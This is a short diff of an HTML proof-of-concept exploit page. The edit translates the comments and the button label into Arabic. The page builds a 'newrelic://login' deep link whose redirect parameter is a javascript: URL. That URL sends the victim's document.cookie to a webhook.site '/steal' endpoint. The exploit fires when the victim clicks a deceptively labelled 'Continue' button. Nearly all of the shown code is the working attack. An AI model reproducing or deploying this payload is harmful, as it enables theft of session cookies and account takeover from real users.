@@ -1,16 +1,15 @@
-<!-- malicious.html -->
 <html>
 <body>
     <script>
         function exploit() {
-            // Create malicious deep link with parameters
-            const payload = 'newrelic://login?redirect=' +
+            // إنشاء رابط خبيث
+            const payload = 'newrelic://login?redirect=' + 
                 encodeURIComponent('javascript:fetch("https://webhook.site/c9b4b61b-a148-485e-9b8a-66c16d1e1706/steal?data="+document.cookie)');
-
-            // Trigger the deep link
+            
+            // تنفيذ الرابط
             window.location.href = payload;
         }
     </script>
-    <button onclick="exploit()">Click to Continue</button>
+    <button onclick="exploit()">متابعة</button>
 </body>
 </html>
